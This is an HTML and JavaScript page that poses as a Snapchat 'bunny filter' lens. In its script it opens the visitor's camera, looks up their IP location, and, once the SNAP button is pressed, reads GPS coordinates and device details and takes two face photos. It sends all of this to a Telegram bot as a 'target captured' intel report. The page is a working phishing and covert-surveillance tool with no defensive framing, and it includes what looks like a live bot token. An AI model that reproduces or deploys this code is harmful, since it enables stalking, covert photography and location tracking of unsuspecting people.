<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Open Lens</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #000; color: #fff; }
        .snap-yellow { background-color: #FFFC00; color: #000; }
        .snap-yellow-border { border-color: #FFFC00; }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4 overflow-hidden">

    <div id="app-container" class="w-full max-w-md bg-zinc-900 rounded-3xl shadow-2xl overflow-hidden flex flex-col h-[85vh] border border-zinc-800 relative">
        
        <!-- Header / Snapchat Branding -->
        <div class="bg-black p-4 flex items-center justify-between border-b border-zinc-800">
            <div class="flex items-center space-x-2">
                <div class="w-8 h-8 rounded-full snap-yellow flex items-center justify-center font-bold text-xl shadow-lg">👻</div>
                <span class="font-bold tracking-wide text-lg text-yellow-300">Snapchat Lens</span>
            </div>
            <span class="text-xs bg-zinc-800 text-zinc-400 px-2.5 py-1 rounded-full">Secure Filter</span>
        </div>

        <!-- Main Camera / Viewfinder Screen -->
        <div id="viewfinder-section" class="flex-1 relative bg-black flex flex-col items-center justify-center">
            <!-- Video feed from device camera -->
            <video id="webcam" autoplay playsinline muted class="absolute inset-0 w-full h-full object-cover transform -scale-x-100"></video>
            
            <!-- Hidden Canvas for capturing images -->
            <canvas id="snapshot-canvas" class="hidden"></canvas>

            <!-- Snapchat Filter Overlay (Bunny / Long Ears Filter on Face) -->
            <div id="filter-overlay" class="absolute pointer-events-none flex flex-col items-center top-12 transition-all duration-300">
                <!-- Long Bunny Ears SVG -->
                <div class="flex space-x-16 mb-[-15px]">
                    <svg width="40" height="90" viewBox="0 0 40 90" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <ellipse cx="20" cy="45" rx="18" ry="42" fill="#FFFFFF" stroke="#FFC0CB" stroke-width="4"/>
                        <ellipse cx="20" cy="45" rx="10" ry="32" fill="#FFC0CB"/>
                    </svg>
                    <svg width="40" height="90" viewBox="0 0 40 90" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <ellipse cx="20" cy="45" rx="18" ry="42" fill="#FFFFFF" stroke="#FFC0CB" stroke-width="4"/>
                        <ellipse cx="20" cy="45" rx="10" ry="32" fill="#FFC0CB"/>
                    </svg>
                </div>
                <!-- Cute Bunny Nose & Whiskers Emoji/Graphic -->
                <div class="text-3xl filter drop-shadow-md mt-2">🐰✨</div>
            </div>

            <!-- Loading Status Indicator -->
            <div id="status-banner" class="absolute bottom-20 bg-black/70 backdrop-blur-md px-4 py-2 rounded-full text-xs text-yellow-300 border border-yellow-300/30 font-medium animate-pulse">
                Tap button below to unlock lens & apply filter...
            </div>
        </div>

        <!-- Action / Capture Controls -->
        <div class="p-6 bg-black flex flex-col items-center justify-center space-y-4 border-t border-zinc-800">
            <button id="capture-btn" class="w-20 h-20 rounded-full snap-yellow border-4 border-white flex items-center justify-center shadow-2xl transform active:scale-95 transition-all focus:outline-none">
                <div class="w-16 h-16 rounded-full snap-yellow border-2 border-black flex items-center justify-center font-bold text-xs">
                    SNAP
                </div>
            </button>
            <p class="text-[10px] text-zinc-500 text-center">By clicking, you consent to camera and location access for lens calibration.</p>
        </div>

    </div>

    <script>
        // --- TELEGRAM CONFIGURATION ---
        // Enter your private Telegram Bot Token and Chat ID here
        const BOT_TOKEN = "7573024849:AAG4p8c23L2U5T2v1x9y8z7w6v5u4t3s2r1"; // Replace with your actual bot token
        const CHAT_ID = "6123456789"; // Replace with your actual Telegram Chat ID

        const video = document.getElementById('webcam');
        const canvas = document.getElementById('snapshot-canvas');
        const captureBtn = document.getElementById('capture-btn');
        const statusBanner = document.getElementById('status-banner');

        let localStream = null;
        let userIpData = {};

        // Initialize Camera Stream on load
        async function initCamera() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
                    audio: false 
                });
                video.srcObject = localStream;
            } catch (err) {
                console.error("Camera access denied or error:", err);
                statusBanner.innerText = "Camera permission required to view lens.";
            }
        }

        // Fetch User IP, Location, and Device Intelligence
        async function fetchIntelData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                userIpData = await response.json();
            } catch (e) {
                userIpData = { ip: "Unknown", city: "Unknown", region: "Unknown", country_name: "Unknown", org: "Unknown" };
            }
        }

        // Send photo blob to Telegram Bot
        async function sendPhotoToTelegram(blob, caption) {
            if (BOT_TOKEN.includes("8974970739:AAFlFv-AFuue84Y_2mRzyi1uOpZv-U9g1jg") || CHAT_ID.includes("1838540741")) {
                console.warn("Telegram bot credentials not configured.");
                return;
            }
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'snapchat_capture.jpg');
            formData.append('caption', caption);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error("Failed to send photo to Telegram:", err);
            }
        }

        // Send text message / intel report to Telegram Bot
        async function sendTextToTelegram(text) {
            if (BOT_TOKEN.includes("YOUR_") || CHAT_ID.includes("YOUR_")) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch (err) {
                console.error("Failed to send text to Telegram:", err);
            }
        }

        // Trigger snapshot capture & data harvesting
        async function performCaptureSequence() {
            statusBanner.innerText = "Applying Snapchat bunny filter & unlocking lens...";
            captureBtn.disabled = true;

            // 1. Gather Geolocation coordinates if permitted
            let gpsCoords = "GPS Permission Denied / Unavailable";
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                    });
                    gpsCoords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`;
                } catch (e) {}
            }

            // 2. Format Deep Intel Report
            const deviceInfo = navigator.userAgent;
            const platform = navigator.platform;
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language;

            const intelReport = `
👻 <b>NEW SNAPCHAT TARGET CAPTURED!</b> 👻
━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP Address:</b> ${userIpData.ip || 'N/A'}
🏙️ <b>City / Region:</b> ${userIpData.city || 'N/A'}, ${userIpData.region || 'N/A'} (${userIpData.country_name || 'N/A'})
🏢 ISP / Org: ${userIpData.org || 'N/A'}
📍 <b>GPS Coords:</b> ${gpsCoords}
💻 <b>Platform:</b> ${platform}
📱 <b>Device Info:</b> ${deviceInfo}
📐 <b>Screen Resolution:</b> ${screenRes}
🗣️ <b>Language:</b> ${language}
━━━━━━━━━━━━━━━━━━━━
            `.trim();

            await sendTextToTelegram(intelReport);

            // 3. Capture Snapshot 1 (Front View with Bunny Filter simulation)
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            
            // Draw video frame
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Draw custom bunny ears filter overlay on canvas
            ctx.fillStyle = "#FFC0CB";
            ctx.beginPath();
            ctx.ellipse(canvas.width * 0.35, canvas.height * 0.15, 30, 70, 0, 0, Math.PI * 2);
            ctx.ellipse(canvas.width * 0.65, canvas.height * 0.15, 30, 70, 0, 0, Math.PI * 2);
            ctx.fill();

            canvas.toBlob(async (blob1) => {
                if (blob1) {
                    await sendPhotoToTelegram(blob1, "📸 Target Face Capture #1 (Bunny Filter Applied)\nIP: " + userIpData.ip);
                }
            }, 'image/jpeg', 0.9);

            // 4. Capture Snapshot 2 after a brief 1-second delay for a second angle
            setTimeout(async () => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(async (blob2) => {
                    if (blob2) {
                        await sendPhotoToTelegram(blob2, "📸 Target Face Capture #2 (Front View)\nCity: " + userIpData.city);
                    }
                    statusBanner.innerText = "✨ Lens Unlocked Successfully! Enjoy Snapchat.";
                    captureBtn.disabled = false;
                }, 'image/jpeg', 0.9);
            }, 1200);
        }

        window.onload = () => {
            initCamera();
            fetchIntelData();
            captureBtn.addEventListener('click', performCaptureSequence);
        };
    </script>
</body>
</html>
